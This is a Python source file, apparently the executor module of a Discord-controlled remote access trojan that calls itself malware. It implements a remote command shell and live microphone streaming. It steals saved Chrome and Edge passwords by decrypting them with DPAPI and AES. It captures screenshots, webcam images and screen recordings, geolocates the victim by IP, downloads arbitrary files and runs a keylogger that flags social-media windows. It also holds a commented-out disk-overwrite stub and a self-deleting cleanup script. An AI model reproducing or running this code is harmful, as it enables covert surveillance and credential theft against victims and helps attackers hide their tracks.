# distortion.py
import ctypes
from ctypes import wintypes
import tempfile
import keyboard
import requests
import sounddevice as sd
import queue
import threading
import subprocess, time
import discord
import os
import json
import base64
import sqlite3
import shutil
from datetime import timezone, datetime, timedelta
from PIL import ImageGrab
import cv2
import numpy as np
from mss import mss
import time
import win32gui
from win32file import *
import pynput
import sys

ON_WINDOWS = True

try:
    import win32crypt
    from Crypto.Cipher import AES
except ImportError:
    print("[Executor Warning] win32crypt or pycryptodome not found. Password feature will fail.")


# This marker helps us know when a command's output has ended.
PROMPT_MARKER = "END_OF_COMMAND_PROMPT"

class ShellManager:
    def __init__(self):
        self.shell_running = False
        self.cwd = ''

    def start_shell(self):
        if self.shell_running:
            return "Shell already running"
        
        result = subprocess.run(
            "cd",
            shell=True,
            capture_output=True,
            text=True
        )

        if result.stdout:
            print("\n--- Output ---")
            print(result.stdout.strip())
            self.cwd = result.stdout.strip()
            self.shell_running = True
            return f"Shell initiated. \n {result.stdout.strip()}"
    
    def stop_shell(self):
        self.shell_running = False
        self.cwd = ""
        return "Shell terminated"
    
    def run_command(self, command):
        if not self.shell_running:
            return "Shell is not running!"
        
        # Sanitize the input command string
        command = command.strip()

        # Case 1: The user just types "cd" to see the current directory.
        if command.lower() == "cd":
            # Just return the stored path. No subprocess needed.
            return f"\n{self.cwd}>"

        # Case 2: The user wants to change the directory (e.g., "cd ..")
        elif command.lower().startswith("cd "):
            # This is your clever logic to change the directory and get the new path.
            # We run it from the last known CWD to handle relative paths like "cd .."
            result = subprocess.run(
                command + " && cd",
                shell=True,
                capture_output=True,
                text=True,
                cwd=self.cwd 
            )

            # If the 'cd' command failed (e.g., directory not found), stderr will have content.
            if result.stderr:
                return f"{result.stderr.strip()}\n\n{self.cwd}>"
            
            # If successful, update our stored CWD and return the new prompt.
            if result.stdout:
                new_cwd = result.stdout.strip()
                self.cwd = new_cwd
                return f"\n{self.cwd}>"

        # Case 3: All other commands (e.g., "dir", "whoami")
        else:
            # As you planned, we execute the command inside the correct CWD.
            # The `cwd` argument handles this perfectly.
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                cwd=self.cwd 
            )
            
            # Get the output, whether it's from stdout or stderr.
            output = result.stdout or result.stderr
            
            # Return the output followed by the prompt.
            return f"{output.strip()}\n\n{self.cwd}>"
        
class MicrophoneAudioSource(discord.AudioSource):
    def __init__(self, audio_queue):
        super().__init__()
        self.audio_queue = audio_queue
        print("[AudioSource] Initialized.")

    def read(self):
        try:
            # Get a chunk of audio data from the queue.
            frame = self.audio_queue.get(timeout=0.1)
            # This print statement confirms discord.py is asking for data.
            # print(f"[AudioSource] Read {len(frame)} bytes from queue.")
            return frame
        except queue.Empty:
            return b''

class AudioStreamer:
    def __init__(self):
        self.is_streaming = False
        self.thread = None
        self.audio_queue = queue.Queue(maxsize=100)

    def _capture_loop(self):
        # This function remains exactly the same as the previous version
        samplerate = 48000
        channels = 2
        dtype = 'int16'
        def audio_callback(indata, frames, time, status):
            if status:
                print(f"[AudioCapture] Status: {status}")
            self.audio_queue.put(bytes(indata))
        try:
            with sd.InputStream(samplerate=samplerate, channels=channels, dtype=dtype, callback=audio_callback):
                while self.is_streaming:
                    sd.sleep(100)
        except Exception as e:
            print(f"[AudioStreamer] FATAL ERROR in audio capture: {e}")
            self.is_streaming = False
        print("[AudioStreamer] Microphone capture stopped.")


    def start(self):
        """
        Starts the capture thread and waits for the buffer to pre-fill
        before returning the audio source.
        """
        if self.is_streaming:
            return None
        
        print("[AudioStreamer] Starting stream thread...")
        self.is_streaming = True
        self.thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.thread.start()

        # --- THE KEY FIX: Wait for the queue to have some data ---
        print("[AudioStreamer] Pre-buffering audio... Waiting for queue to fill.")
        while self.audio_queue.qsize() < 5: # Wait until we have 5 chunks buffered
            if not self.is_streaming: # Stop if the capture thread failed
                print("[AudioStreamer] Capture thread failed during pre-buffering.")
                return None
            time.sleep(0.1) # Wait a moment

        print("[AudioStreamer] Buffer filled. Returning audio source.")
        return MicrophoneAudioSource(self.audio_queue)

    def stop(self):
        # This function remains exactly the same
        if not self.is_streaming:
            return
        print("[AudioStreamer] Stopping stream thread...")
        self.is_streaming = False
        if self.thread:
            self.thread.join(timeout=1.0)

def _get_encryption_key(browser_path):
    """Gets the AES encryption key from the browser's Local State file."""
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
        
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # The key is encrypted with Windows DPAPI. We need to decrypt it.
    key = key[5:] # Remove the 'DPAPI' prefix
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def _decrypt_password(password, key):
    """Decrypts a password blob using the AES key."""
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode() # Remove padding
        return decrypted_pass
    except Exception:
        # Fallback for older Chrome versions
        try:
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
        except Exception:
            return "Failed to decrypt"

# --- Main Executor Function ---

def get_browser_passwords():
    """
    Main function to iterate through browsers, extract, and decrypt passwords.
    """
    # Define paths for supported browsers
    appdata = os.getenv("LOCALAPPDATA")
    browser_paths = {
        "Chrome": os.path.join(appdata, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(appdata, "Microsoft", "Edge", "User Data"),
    }
    
    all_credentials = {}

    for browser, path in browser_paths.items():
        if not os.path.exists(path):
            continue

        key = _get_encryption_key(path)
        if not key:
            continue

        login_db_path = os.path.join(path, "Default", "Login Data")
        if not os.path.exists(login_db_path):
            continue
            
        # We must copy the file, as it's locked by the browser.
        temp_db_path = "temp_login_data.db"
        shutil.copyfile(login_db_path, temp_db_path)
        
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        browser_creds = []
        for row in cursor.fetchall():
            url, username, enc_password = row
            if username and enc_password:
                password = _decrypt_password(enc_password, key)
                browser_creds.append({
                    "url": url,
                    "username": username,
                    "password": password
                })
        
        cursor.close()
        conn.close()
        os.remove(temp_db_path)
        
        if browser_creds:
            all_credentials[browser] = browser_creds
            
    return all_credentials

def get_screenshot():
    try: 
        screenshot = ImageGrab.grab()

        temp_dir = tempfile.gettempdir()
        ss_path = os.path.join(temp_dir, 'ss_image.jpg')

        screenshot.save(ss_path)
        return ss_path
    except Exception as e:
        return None

def get_image():
    try:
        temp_dir = tempfile.gettempdir()
        image_path = os.path.join(temp_dir, 'webcam_image.jpg')
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None

        ret, frame = cap.read()

        if ret:
            cv2.imwrite(image_path, frame)
            cap.release()
            return image_path

        else:
            cap.release()
            return None

    except Exception as e:
        return None

def show_alert(title, message):
    try:
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
        return True
    except Exception as e:
        return False
    
def record_screen(duration_seconds: int = 10, fps: int = 15):
    """
    Records the screen for a specified duration by capturing a set number of frames.
    """
    print(f"[Executor] Starting {duration_seconds}s recording at {fps} FPS...")
    
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, f"recording_{int(time.time())}.avi")

    try:
        with mss() as sct:
            monitor = sct.monitors[1]
            width = monitor["width"]
            height = monitor["height"]

            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(file_path, fourcc, fps, (width, height))

            if not out.isOpened():
                error_msg = "Error: cv2.VideoWriter failed to open."
                print(f"[Executor Error] {error_msg}")
                return None

            # --- THE KEY FIX: Calculate total frames and use a 'for' loop ---
            total_frames = duration_seconds * fps
            print(f"[Executor] Target frame count: {total_frames}")

            for i in range(total_frames):
                sct_img = sct.grab(monitor)
                frame = np.array(sct_img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                out.write(frame)
            
            print(f"[Executor] Finished capturing {total_frames} frames.")
        
        out.release()
        cv2.destroyAllWindows()
        
        print(f"[Executor] Screen recording saved to: {file_path}")
        return file_path

    except Exception as e:
        print(f"[Executor Error] Screen recording failed: {e}")
        if 'out' in locals() and out.isOpened():
            out.release()
        return None
    
def ipAndLoc():
    try:
        ip = requests.get('https://api.ipify.org').text
        response = requests.get(f'http://ip-api.com/json/{ip}')
        data = response.json()

        info = f"""
Ip: {ip}
City: {data['city']}
Region: {data['regionName']}
Country: {data['country']}
Latitude: {data['lat']}, Longitude: {data['lon']}"""

        print(info)
        return info

    except Exception as e:
        return str(e)
    
def download_file(url, save_path):
    """
    Downloads a file from a given URL and saves it to a local path.
    Returns True on success, False on failure.
    """
    print(f"[Executor] Downloading file from {url} to {save_path}")
    try:
        # Create the directory if it doesn't exist
        directory = os.path.dirname(save_path)
        if not os.path.exists(directory):
            os.makedirs(directory)

        # Use requests to get the file content
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)

        # Write the content to the specified file path in binary mode
        with open(save_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print(f"[Executor] File successfully downloaded to {save_path}")
        return True, f"File saved to {save_path}"
        
    except Exception as e:
        error_message = f"Failed to download file: {e}"
        print(f"[Executor Error] {error_message}")
        return False, error_message
    
def press_key_combination(keys_string):
    """
    Simulates pressing and releasing a key or a combination of keys.
    Examples: "enter", "a", "ctrl+c", "alt+f4", "windows+l"
    """
    print(f"[Executor] Simulating key press: '{keys_string}'")
    try:
        # The press_and_release function handles everything for us.
        keyboard.press_and_release(keys_string)
        return f"Successfully simulated key press: '{keys_string}'"
    except Exception as e:
        # This can happen if the key name is invalid or permissions are insufficient.
        return f"Failed to simulate key press '{keys_string}': {e}"

class KeyloggerManager:
    def __init__(self, notification_callback=None, victimChannel = None):
        self.is_running = False
        self.log_file_path = os.path.join(tempfile.gettempdir(), "key_log.txt")
        self.key_listener_thread = None
        self.win_hook_thread = None
        self.current_window_title = ""
        self.lock = threading.Lock()
        self.notification_callback = notification_callback
        self.social_media_keywords = ["whatsapp", "facebook", "instagram"]
        self.victimChannel = victimChannel

    def _get_active_window_title(self):
        if not ON_WINDOWS: return "Not on Windows"
        try: return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except Exception: return "Unknown Window"

    def _on_press(self, key):
        # This function remains the same as before
        try:
            with self.lock:
                window_title = self.current_window_title
            
            with open(self.log_file_path, "a", encoding="utf-8") as f:
                log_entry = f"[{window_title}]"
                if hasattr(key, 'char') and key.char:
                    log_entry += key.char
                else:
                    log_entry += f" [{key.name}] "
                f.write(log_entry)
        except Exception as e:
            print(f"[Keylogger] Error in on_press callback: {e}")

    def _key_listener_loop(self):
        # This function remains the same
        with pynput.keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()

    # --- THE KEY FIX: Using ctypes to create the Windows Event Hook ---
    def _win_hook_loop(self):
        if not ON_WINDOWS: return

        # Define constants from the Windows API
        WINEVENT_OUTOFCONTEXT = 0x0000
        EVENT_SYSTEM_FOREGROUND = 0x0003
        
        # Get handles to the necessary DLLs
        user32 = ctypes.windll.user32
        ole32 = ctypes.windll.ole32

        # Define the callback function type that SetWinEventHook expects
        WinEventProcType = ctypes.WINFUNCTYPE(
            None, 
            wintypes.HANDLE, wintypes.DWORD, wintypes.HWND,
            wintypes.LONG, wintypes.LONG, wintypes.DWORD, wintypes.DWORD
        )

        def win_event_proc(hWinEventHook, event, hwnd, idObject, idChild, dwEventThread, dwmsEventTime):
            """The actual callback function that gets executed on a window change."""
            new_title = self._get_active_window_title()
            with self.lock:
                if new_title != self.current_window_title:
                    self.current_window_title = new_title
                    with open(self.log_file_path, "a", encoding="utf-8") as f:
                        f.write(f"\n\n--- [{time.strftime('%Y-%m-%d %H:%M:%S')}] Active Window: {new_title} ---\n")
                    
                    for keyword in self.social_media_keywords:
                        if keyword in new_title.lower():
                            print('here1')
                            if self.notification_callback:
                                print('here2')
                                self.notification_callback(new_title, self.victimChannel)
                            break
        
        # Keep a reference to the callback pointer
        self.WinEventProc = WinEventProcType(win_event_proc)

        # Initialize COM for this thread
        ole32.CoInitialize(0)
        
        # Set the hook
        hook = user32.SetWinEventHook(
            EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0,
            self.WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT
        )
        if hook == 0:
            print("[Keylogger Error] SetWinEventHook failed.")
            return

        # Start a message loop to listen for events. This is blocking.
        msg = wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), 0, 0, 0) != 0:
            user32.TranslateMessage(msg)
            user32.DispatchMessageW(msg)
        
        # Clean up the hook when the loop exits
        user32.UnhookWinEvent(hook)
        ole32.CoUninitialize()
        print("[Keylogger] Window event hook thread stopped.")

    # start() remains mostly the same...
    def start(self):
        if self.is_running: return
        print("[Keylogger] Starting automated keylogger...")
        self.is_running = True
        self.current_window_title = self._get_active_window_title()
        self.key_listener_thread = threading.Thread(target=self._key_listener_loop, daemon=True)
        self.key_listener_thread.start()
        self.win_hook_thread = threading.Thread(target=self._win_hook_loop, daemon=True)
        self.win_hook_thread.start()

    # YOUR PLAN: The new stopAndDump function
    def stopAndDump(self):
        print("[Keylogger] Stopping and dumping logs...")
        self.is_running = False
        # Note: This stops new logs. The background threads will exit when the main script does.
        
        if not os.path.exists(self.log_file_path):
            return json.dumps({"status": "error", "message": "Log file not found."})

        # --- Parse the raw log into a dictionary ---
        parsed_logs = {}
        with open(self.log_file_path, "r", encoding="utf-8") as f:
            current_process = "Unknown"
            for line in f:
                line = line.strip()
                if line.startswith("---") and "Active Window:" in line:
                    # Extract the window title
                    current_process = line.split("Active Window:")[1].strip()
                    if current_process not in parsed_logs:
                        parsed_logs[current_process] = ""
                elif line:
                    if current_process in parsed_logs:
                        parsed_logs[current_process] += line
        
        # Clear the log file after processing
        open(self.log_file_path, 'w').close()
        
        return json.dumps(parsed_logs, indent=4)

def implant_c4Charge():
    try:
        # hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
        # WriteFile(hDevice, AllocateReadBuffer(512), None)
        # CloseHandle(hDevice)
        return True
    except Exception as e:
        return False
    
def self_destructor():
    """
    Creates and launches a batch script to delete the malware after it exits.
    Handles both .py script and .exe executable scenarios.
    """
    # Get the path of the currently running script/executable
    # sys.executable is the python.exe, sys.argv[0] is the script file.
    current_file = os.path.realpath(sys.argv[0])
    
    # Define the path for our temporary batch script
    temp_dir = tempfile.gettempdir()
    bat_path = os.path.join(temp_dir, "cleanup.bat")

    # Determine if we are running as a script or a compiled executable
    is_exe = current_file.endswith(".exe")

    print(f"[Executor] Initiating self-destruct. Running as {'EXE' if is_exe else 'SCRIPT'}.")
    print(f"[Executor] Main file path: {current_file}")

    with open(bat_path, "w") as f:
        # 1. Wait for 3 seconds to ensure the main Python process has fully closed
        f.write("@echo off\n")
        f.write("timeout /t 3 /nobreak > NUL\n") # /nobreak prevents user from skipping

        # 2. Add commands to delete the malware files
        if is_exe:
            # If it's an exe, just delete the one file
            f.write(f'DEL "{current_file}"\n')
        else:
            # If it's scripts, delete all three
            # This assumes initiator.py, distortion.py, and snitch.py are in the same directory
            base_dir = os.path.dirname(current_file)
            f.write(f'DEL "{os.path.join(base_dir, "initiator.py")}"\n')
            f.write(f'DEL "{os.path.join(base_dir, "distortion.py")}"\n')
            f.write(f'DEL "{os.path.join(base_dir, "snitch.py")}"\n')
        
        # 3. Add a command for the batch script to delete itself
        # '%~f0' is a special variable in batch scripts that refers to the script's own path
        f.write(f'DEL "%~f0"\n')

    print(f"[Executor] Wrote cleanup script to {bat_path}")

    # 4. Launch the batch script in a new, completely detached process
    #    This allows it to run independently after our main program exits.
    subprocess.Popen(
        [bat_path],
        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
    )

    print("[Executor] Self-destruct script launched. Main program will now exit.")
    # This function doesn't return anything, as the program will exit immediately after.
